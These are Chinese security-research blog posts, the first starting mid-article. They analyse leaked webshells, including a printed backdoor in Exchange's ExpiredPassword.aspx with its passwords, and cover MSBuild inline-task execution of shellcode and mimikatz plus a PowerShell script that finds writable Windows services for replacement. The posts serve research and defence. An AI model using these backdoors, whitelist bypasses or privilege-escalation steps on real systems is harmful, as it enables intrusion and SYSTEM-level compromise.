<p>默认访问页面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-1.png" alt="Alt text"></p>

<p>Login框为红色，需要输入连接口令</p>

<p>正确的口令为<code class="language-plaintext highlighter-rouge">Th!sN0tF0rFAN</code></p>

<p>输入正确的口令后，点击Do it，刷新页面，成功登录，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-2.png" alt="Alt text"></p>

<p>Login框变为绿色</p>

<p>该工具的公开线索：</p>

<p>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</p>

<p>HighShell同paloaltonetworks在文中提到的TwoFace的页面相同</p>

<h2 id="0x03-对hypershell的分析">0x03 对HyperShell的分析</h2>
<hr>

<p>对应泄露文件的名称为Webshells_and_Panel中的HyperShell</p>

<p>下面包含7个文件夹:</p>

<ol>
  <li>ExpiredPasswordTech</li>
  <li>HyperShell</li>
  <li>Image</li>
  <li>Libraries</li>
  <li>packages</li>
  <li>ShellLocal</li>
  <li>StableVersion</li>
</ol>

<h3 id="1expiredpasswordtech">1.ExpiredPasswordTech</h3>

<p>包括3个文件：</p>

<ul>
  <li>error4.aspx，功能与HighShell.aspx相同，但登录口令未知</li>
  <li>ExpiredPassword.aspx，适用于Exchange的webshell</li>
  <li>MyMaster.aspx，生成字符串：<code class="language-plaintext highlighter-rouge">NxKK&lt;TjWN^lv-$*UZ|Z-H;cGL(O&gt;7a</code></li>
</ul>

<h3 id="2hypershell">2.HyperShell</h3>

<p>包含多个文件，是各个webshell的源码文件</p>

<p>其中包含另一个可用的webshell，相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\HyperShell\Shell\simple.aspx</code></p>

<p>连接口令：<code class="language-plaintext highlighter-rouge">MkRg5dm8MOk</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-3.png" alt="Alt text"></p>

<h3 id="3image">3.Image</h3>

<p>图片文件夹</p>

<h3 id="4libraries">4.Libraries</h3>

<p>包含多个依赖文件</p>

<h3 id="5packages">5.packages</h3>

<p>包含多个依赖文件</p>

<h3 id="6-shelllocal">6. ShellLocal</h3>

<p>空文件夹</p>

<h3 id="7-stableversion">7. StableVersion</h3>

<p>稳定版本，包含多个webshell</p>

<h4 id="1expiredpasswordaspx">(1)ExpiredPassword.aspx</h4>

<p>适用于Exchange的webshell</p>

<p>相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\StableVersion\HighShell v5.0\HyperShell\HyperShell\ExpiredPasswordTech</code></p>

<p>与相对路径<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\ExpiredPasswordTech</code>下的文件内容相同</p>

<p>ExpiredPassword.aspx是Exchange正常的功能，对应重置用户口令的页面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-1.png" alt="Alt text"></p>

<p>访问的URL：<code class="language-plaintext highlighter-rouge">https://&lt;domain&gt;/owa/auth/ExpiredPassword.aspx</code></p>

<p>对应Windows绝对路径：<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ExpiredPassword.aspx</code></p>

<p>该路径下的webshell默认权限为System</p>

<p>我的测试系统安装了Exchange2013，正常的ExpiredPassword.aspx源码我已经上传至github：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx(2013)</p>

<p>HyperShell中的ExpiredPassword.aspx是一个添加了后门代码的文件，同我测试环境的正常ExpiredPassword.aspx文件相比有多处不同，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-2.png" alt="Alt text"></p>

<p>经过分析发现有可能是Exchange版本差异导致的，忽略版本差异，HyperShell中的ExpiredPassword.aspx主要添加了如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>              &lt;%
                    try{
                    if (Convert.ToBase64String(new System.Security.Cryptography.SHA1Managed().ComputeHash(Encoding.ASCII.GetBytes(Encoding.ASCII.GetString(Convert.FromBase64String(Request.Form["newPwd1"])) + "reDGEa@#!%FS"))) == "+S6Kos9D/etq1cd///fgTarVnUQ=")
                    {
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo i = p.StartInfo;
                        i.FileName = "cmd";
                        i.Arguments = "/c " + Encoding.UTF8.GetString(Convert.FromBase64String(Request.Form["newPwd2"]));
                        i.UseShellExecute = false;
                        i.CreateNoWindow = true;
                        i.RedirectStandardOutput = true;
                        p.Start();
                        string r = p.StandardOutput.ReadToEnd();
                        p.WaitForExit();
                        p.Close();
                        Response.Write("&lt;pre&gt;" + Server.HtmlEncode(r) + "&lt;/pre&gt;");
                        Response.End();
                    }}catch{}
                %&gt;
</code></pre></div></div>

<p>对应到我的测试环境，也就是Exchange2013，添加payload后并去掉验证环节的代码已上传至github：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx(2013)(HyperShell)</p>

<p><code class="language-plaintext highlighter-rouge">Confirm new password</code>项为传入要执行的命令，权限为System</p>

<h4 id="2highshelllocal">(2)HighShellLocal</h4>

<p>功能强大的webshell</p>

<p>相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\Webshells_and_Panel\HyperShell\StableVersion\HighShell v5.0\HyperShell\HyperShell\ShellLocal\StableVersions\ShellLocal-v8.8.5.rar</code></p>

<p>解压到当前目录，相对路径为<code class="language-plaintext highlighter-rouge">.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\HighShellLocal</code>，包括以下文件：</p>

<ul>
  <li>文件夹css</li>
  <li>文件夹files</li>
  <li>文件夹js</li>
  <li>HighShellLocal.aspx</li>
</ul>

<p>实际使用时，还需要<code class="language-plaintext highlighter-rouge">.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\</code>下的bin文件夹，否则提示无法使用Json</p>

<p>完整结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│   HighShellLocal.aspx
│
├───bin
│       Newtonsoft.Json.dll
│
├───css
│   │   main.css
│   │
│   └───img
│           box-zipper.png
│           download-cloud.png
│           exclamation-diamond.png
│           heart-break.png
│           heart-empty.png
│           heart.png
│           minus-button.png
│
├───files
│       7za.exe
│       nbt.exe
│       rx.exe
│
└───js
    │   explorer.js
    │   main.js
    │   send.js
    │   utility.js
    │
    ├───components
    │      
    ├───jquery
    │       
    └───semantic
</code></pre></div></div>

<p>登录口令：<code class="language-plaintext highlighter-rouge">Th!sN0tF0rFAN</code></p>

<p>登录页面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-4.png" alt="Alt text"></p>

<p>输入正确的登录口令后，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-5.png" alt="Alt text"></p>

<p>可以看到该webshell支持多个功能</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文对泄露文件中的HighShell和HyperShell进行了分析，其中HyperShell中的ExpiredPassword.aspx是一个比较隐蔽的webshell，目前为止我还未在公开资料中找到这种利用方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 20, 2019
  </div>

  
</article><article class="post">
  <h1>Use MSBuild To Do More</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>最近Casey Smith@subTee更新了一系列关于”MSBuild”的研究进展，对我有很大启发。
本文将基于他公开的POC，并结合我的研究心得，介绍以下<code class="language-plaintext highlighter-rouge">MSBuild</code>的应用技巧：</p>

<ul>
  <li>Execute PowerShell Commands</li>
  <li>Execute PE file</li>
  <li>Execute Shellcode</li>
  <li>VisualStudio Persistence</li>
</ul>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台</p>

<p>MSBuild可在未安装Visual Studio的环境中编译.net的工程文件</p>

<p>MSBuild可编译特定格式的xml文件</p>

<p>更多基本知识可参照以下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/dd393574.aspx</p>

<h2 id="0x02-常规用法">0x02 常规用法</h2>
<hr>

<h3 id="1-编译xml文件并执行代码">1. 编译xml文件并执行代码</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
  &lt;Target Name="PrintCurrentDateTime"&gt;
    &lt;Message Text="The current date and time is: $(&amp;#91;System.DateTime&amp;#93;::Now)." /&gt;
  &lt;/Target&gt;
&lt;/Project&gt;
</code></pre></div></div>

<p>保存为test.csproj</p>

<p>cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe test.csproj
</code></pre></div></div>

<p>在cmd下会输出显示当前时间，如图
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/2-1.png" alt="Alt text"></p>

<h3 id="2-编译xml文件生成exe">2. 编译xml文件生成exe</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
class Test
{
    static void Main()
    {
        Console.WriteLine("Hello world");
    }
}
</code></pre></div></div>

<p>保存为hello.cs</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
    &lt;Target Name="Compile"&gt;
        &lt;CSC Sources="hello.cs" OutputAssembly="hello.exe" /&gt;
    &lt;/Target&gt;
&lt;/Project&gt;
</code></pre></div></div>

<p>保存为hello.csproj</p>

<p>hello.cs和hello.csproj放于同一目录</p>

<p>cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj
</code></pre></div></div>

<p>可以编译生成hello.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>编译文件满足xml文件格式即可，后缀名任意</p>

<h2 id="0x03-扩展用法">0x03 扩展用法</h2>
<hr>
<p>在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码</p>

<p>详细介绍可参考如下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396</p>

<h3 id="1-helloworld示例">1. HelloWorld示例</h3>

<p>以下代码保存为helloworld:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
  &lt;Target Name="Hello"&gt;
   &lt;HelloWorld /&gt;
  &lt;/Target&gt;
  &lt;UsingTask
    TaskName="HelloWorld"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt;
    &lt;ParameterGroup/&gt;
    &lt;Task&gt;
      &lt;Using Namespace="System" /&gt;  
      &lt;Code Type="Fragment" Language="cs"&gt;
        &lt;![CDATA[
			    Console.WriteLine("Hello World");		
        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
    &lt;/UsingTask&gt;
&lt;/Project&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>保存的文件名任意</p>

<p>cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld
</code></pre></div></div>

<p>cmd输出helloworld</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/2-3.png" alt="Alt text"></p>

<h3 id="2-执行powershell命令">2. 执行powershell命令</h3>

<p>可参照Casey分享的POC，地址如下：</p>

<p>https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614</p>

<p>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/3-1.png" alt="Alt text"></p>

<p>标记1TaskName可修改，但两个位置的名称需要对应</p>

<p>标记2为固定格式:<code class="language-plaintext highlighter-rouge">TaskFactory="CodeTaskFactory"</code></p>

<p>标记3的路径在不同系统可能会有区别，准确的为：</p>

<p><code class="language-plaintext highlighter-rouge">"$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll"</code></p>

<p>系统默认安装路径为:</p>

<p><code class="language-plaintext highlighter-rouge">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</code></p>

<p>标记4为一个简单的输出helloworld实例</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/3-2.png" alt="Alt text"></p>

<p>标记5为固定格式，定义为<code class="language-plaintext highlighter-rouge">public class ClassExample :  Task, ITask</code></p>

<p>实际测试POC如图,成功执行powershell命令</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/3-3.png" alt="Alt text"></p>

<h3 id="3-执行pe文件">3. 执行PE文件</h3>
<p>Casey分享的POC地址如下：</p>

<p>https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/3-4.png" alt="Alt text"></p>

<p>但是上传的文件被截断，导致部分代码无法查看，于是尝试自己实现</p>

<p>结合之前研究过的代码，地址如下：</p>

<p>https://gist.github.com/subTee/00cdac8990584bd2c2fe</p>

<p>对照上文提到的xml格式，编写代码实现在Inline Tasks中内存加载64位的mimikatz.exe，实现代码的下载地址为：</p>

<p>https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</p>

<p>cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe aa
</code></pre></div></div>

<p>报错，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/4-1.png" alt="Alt text"></p>

<p><strong>解决方法：</strong></p>

<p>需要换用64位的.net Framework，原代码无需修改，只需要使用64位的.net Framework加载就好</p>

<p>cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa
</code></pre></div></div>

<p>加载成功，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/4-2.png" alt="Alt text"></p>

<h3 id="4-执行shellcode">4. 执行shellcode</h3>

<p>参考自https://gist.github.com/subTee/a06d4ae23e2517566c52</p>

<p>使用msf生成32位shellcode：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use windows/exec
set CMD calc.exe
set EXITFUNC thread
generate -t csharp
</code></pre></div></div>

<p>同样结合上文提到的xml格式，编写代码实现在Inline Tasks中执行shellcode，实现代码的下载地址为：</p>

<p>https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</p>

<p>保存为SimpleTasks.csproj，在cmd下执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj
</code></pre></div></div>

<p>如图，成功执行shellcode弹出计算器</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/4-3.png" alt="Alt text"></p>

<p>在64位系统下，先将shellcode替换为64位，然后换用64位的.net Framework执行即可，代码下载地址为：</p>

<p>https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</p>

<p>如图，成功执行64位shellcode</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/4-4.png" alt="Alt text"></p>

<h3 id="5-visualstudio-persistence">5. VisualStudio Persistence</h3>

<p>在《Pay close attention to your download code——Visual Studio trick to run code when building》中介绍过利用VisualStudio的.csproj文件实现的代码执行，同样Inline Tasks也可用到此处，实现代码已上传，地址为：</p>

<p>https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode%20when%20visual%20studio%20is%20afterBuild.csproj</p>

<p>修改vs工程中的.csproj文件，添加上述代码，能够实现在vs工程编译过程中执行shellcode</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-20/5-1.png" alt="Alt text"></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>
<p>利用MSBuild实现的代码执行，有如下特点：</p>

<ul>
  <li>可绕过应用程序白名单</li>
  <li>提供一种直接执行shellcode的方法</li>
  <li>在内存中执行PE文件</li>
  <li>结合VisualStudio实现的钓鱼和后门</li>
</ul>

<p>所以建议对系统中的msbuild.exe进行更多的监控和限制。</p>

<p><strong>注：</strong></p>

<p>文中相关POC代码已上传至github，地址为：</p>

<p>https://github.com/3gstudent/msbuild-inline-task</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on September 20, 2016
  </div>

  
</article><article class="post">
  <h1>Use powershell to find a writable windows service</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>从DidierStevens的博客学到了一些技巧，本文将要对其中涉及到的技巧进行测试总结，并开源一个powershell脚本，用来寻找可被替换的服务，实现自动化利用。</p>

<p>DidierStevens的博客链接：</p>

<p>https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>使用c#编写可供Windows服务调用的程序</li>
  <li>psexec的-i参数使用技巧</li>
  <li>sc命令使用技巧</li>
  <li>通过powershell获取服务对应的可执行文件路径</li>
  <li>自动化利用脚本开发细节</li>
</ul>

<h2 id="0x02-使用c编写可供windows服务调用的程序">0x02 使用c#编写可供Windows服务调用的程序</h2>
<hr>

<p>可供Windows服务调用的程序需要能够同SCM(Services Control Manager)进行交互，所以在程序编写上需要注意</p>

<p>Didier Stevens在博客中给出了c#开发的模板，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
 
namespace Demo
{
    public class Service : ServiceBase
    {
        protected override void OnStart(string[] args)
        {
            System.Diagnostics.Process.Start("cmd.exe");
        }
    }
 
    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
}
</code></pre></div></div>

<p>由于是c#代码，可以直接用csc.exe进行编译</p>

<p>所以在实际使用的过程，不需要提前编译好exe，只需要将cs脚本上传，再使用csc.exe编译成exe即可</p>

<h2 id="0x03-sc命令使用技巧">0x03 sc命令使用技巧</h2>
<hr>

<p>查询所有服务列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc query  
</code></pre></div></div>

<p>查询指定服务配置信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc 服务名 
</code></pre></div></div>

<p>创建服务：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test type= own binpath= c:\test\test.exe
</code></pre></div></div>

<p>删除服务：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc delete 服务名
</code></pre></div></div>

<h2 id="0x04-通过powershell获取服务对应的可执行文件路径">0x04 通过powershell获取服务对应的可执行文件路径</h2>
<hr>

<p>Didier Stevens在博客中说他朋友找到了一个可写的Windows服务，并且只需要普通用户权限，于是，自然就想到了我们自己能否也找到这个服务</p>

<p>通过sc query能够列举出所有服务名称，再通过sc qc 服务名 查询到该服务对应的可执行文件路径</p>

<p>例如：<code class="language-plaintext highlighter-rouge">sc qc eventlog</code></p>

<p>如下图，eventlog服务对应可执行文件路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\svchost.exe</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-1.png" alt="Alt text"></p>

<p>可以手动去查找每个服务对应的可执行文件路径，看是否存在符合要求的路径（即普通用户可写的权限）</p>

<p>当然，该过程耗时耗力，最好通过编写程序来实现</p>

<p>在Windows系统下，最简单高效的开发语言还是powershell，于是决定使用powershell来实现自动化判断</p>

<p>但是，sc这个命令不能直接在ps里面运行，ps会把它当作set-content的别名</p>

<p><strong>注：</strong></p>

<p>可通过使用sc.exe在ps里面运行sc命令,例如<code class="language-plaintext highlighter-rouge">sc.exe qc eventlog</code></p>

<p><strong>解决方法：</strong></p>

<p>调用WMI来实现，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | select Name,PathName
</code></pre></div></div>

<p>如下图，能够列举服务和对应的可执行文件路径</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-2.png" alt="Alt text"></p>

<h2 id="0x05-自动化利用脚本开发细节">0x05 自动化利用脚本开发细节</h2>
<hr>

<p>下面介绍自动化脚本的开发细节，思路如下：</p>

<p>列举出服务和对应的可执行文件路径后，对每一个路径进行提取，判断该路径是否具有普通用户可写的权限</p>

<h3 id="1获取所有可执行文件路径">1、获取所有可执行文件路径</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | select Name,PathName
</code></pre></div></div>

<h3 id="2将可执行文件路径转换为数组">2、将可执行文件路径转换为数组</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out = (Get-WmiObject win32_service | select PathName)
$out|% {[array]$global:path += $_.PathName}
</code></pre></div></div>

<p>数组范围：</p>

<p><code class="language-plaintext highlighter-rouge">$out[0]</code>至<code class="language-plaintext highlighter-rouge">$out[($out.Count-1)]</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-3.png" alt="Alt text"></p>

<h3 id="3截取路径显示单个数组的文件夹">3、截取路径,显示单个数组的文件夹</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out[0].PathName.Substring($out[0].PathName.IndexOfAny("C"),$out[0].PathName.LastIndexOfAny("\"))
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-4.png" alt="Alt text"></p>

<h3 id="4为了格式统一将字符串都转换为大写">4、为了格式统一，将字符串都转换为大写</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$out[0].PathName.ToUpper().Substring($out[0].PathName.ToUpper().IndexOfAny("C"),$out[0].PathName.ToUpper().LastIndexOfAny("\"))
</code></pre></div></div>

<h3 id="5枚举所有截取过的文件夹">5、枚举所有截取过的文件夹</h3>

<p>使用foreach循环：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach ($item in $out) 
{
	$item.PathName.ToUpper().Substring($item.PathName.ToUpper().IndexOfAny("C"),$item.PathName.ToUpper().LastIndexOfAny("\"))
}
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-5.png" alt="Alt text"></p>

<p>也可使用for循环：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for($i=0;$i -le $out.Count-1;$i++)
{
    $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
}
</code></pre></div></div>

<h3 id="6获取文件夹权限">6、获取文件夹权限</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$a=$out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
Get-Acl -Path $a |select Owner
</code></pre></div></div>

<p>以下三个权限代表管理员权限，不符合要求：</p>

<ul>
  <li>NT AUTHORITY\SYSTEM</li>
  <li>NT SERVICE\TrustedInstaller</li>
  <li>BUILTIN\Administrators</li>
</ul>

<p>因此要对其剔除,剩下的权限代表当前用户，对应代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If($a.Owner -ne "NT AUTHORITY\SYSTEM"){
	If($a.Owner -ne "NT SERVICE\TrustedInstaller"){
		If($a.Owner -ne "BUILTIN\Administrators"){
			$a.Owner	
		}	
	}
}
</code></pre></div></div>

<h3 id="7筛选符合条件的服务后重新查找找到当前用户权限对应的服务名称和路径">7、筛选符合条件的服务后，重新查找，找到当前用户权限对应的服务名称和路径</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName
</code></pre></div></div>

<h3 id="8如果在系统未找到可利用的服务脚本会报错提示不能对-null-值表达式调用方法">8、如果在系统未找到可利用的服务，脚本会报错，提示不能对 Null 值表达式调用方法</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/2-6.png" alt="Alt text"></p>

<p>使用<code class="language-plaintext highlighter-rouge">$ErrorActionPreference="SilentlyContinue"</code>隐藏错误信息，错误信息写入<code class="language-plaintext highlighter-rouge">$Error</code>变量</p>

<p>综上，对输出格式进行优化，完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference="SilentlyContinue"
$out = (Get-WmiObject win32_service | select PathName)
$out|% {[array]$global:path += $_.PathName}
for($i=0;$i -le $out.Count-1;$i++)
{
    $a=Get-Acl -Path $out[$i].PathName.ToUpper().Substring($out[$i].PathName.ToUpper().IndexOfAny("C"),$out[$i].PathName.ToUpper().LastIndexOfAny("\"))
 	If($a.Owner -ne "NT AUTHORITY\SYSTEM"){
		If($a.Owner -ne "NT SERVICE\TrustedInstaller"){
			If($a.Owner -ne "BUILTIN\Administrators"){				
				Get-WmiObject win32_service | ?{$_.PathName -like $out[$i].PathName}|select Name,PathName,ProcessId,StartMode,State,Status
				Write-host Owner: $a.Owner
			}	
		}
    }
}
Write-host [+] All done.
</code></pre></div></div>

<h2 id="0x06-实际测试">0x06 实际测试</h2>
<hr>

<h3 id="1手动创建服务test">1、手动创建服务Test</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test type= own binpath= c:\test\test.exe
</code></pre></div></div>

<h3 id="2编译生成exe">2、编译生成exe</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
namespace Demo
{
    public class Service : ServiceBase
    {
        protected override void OnStart(string[] args)
        {
            System.Diagnostics.Process.Start("calc.exe");
        }
    }
    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
}
</code></pre></div></div>

<p>保存为test.cs</p>

<p>使用csc.exe编译：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs
</code></pre></div></div>

<p>生成test.exe</p>

<h3 id="3启动服务">3、启动服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start Test
</code></pre></div></div>

<p>查看进程，能够看到calc.exe进程启动，权限为system，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-1.png" alt="Alt text"></p>

<h3 id="4替换testexe">4、替换test.exe</h3>

<p>在实际情况，如果没有获得管理员权限，那么无法启动和停止服务</p>

<p>如果不停止服务，就无法直接删除exe，提示拒绝访问</p>

<p>但可以将该文件重命名，相当于变相删除该文件，将新文件再命名为test.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rename test.exe test2.exe
</code></pre></div></div>

<p>这样就可以在不停止服务的情况下实现文件替换，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-2.png" alt="Alt text"></p>

<h3 id="5重启服务">5、重启服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop Test
sc start Test
</code></pre></div></div>

<p>当然，该操作需要管理员权限</p>

<h3 id="6psexec的-i参数使用技巧">6、psexec的-i参数使用技巧</h3>

<p>由于服务启动的exe为system权限，默认为session 0，而用户界面为session 1，所以看不到启动的exe界面</p>

<p>可通过psexec指定启动exe的session，这样就能获取到程序界面</p>

<p>test.cs修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.ServiceProcess;
namespace Demo
{
    public class Service : ServiceBase
    {
        protected override void OnStart(string[] args)
        {
            System.Diagnostics.Process.Start(@"c:\test\psexec.exe", @"-accepteula -d -i 1 calc.exe");
        }
    }
    static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() }); } }
}
</code></pre></div></div>

<p>停止服务： <code class="language-plaintext highlighter-rouge">sc stop Test</code></p>

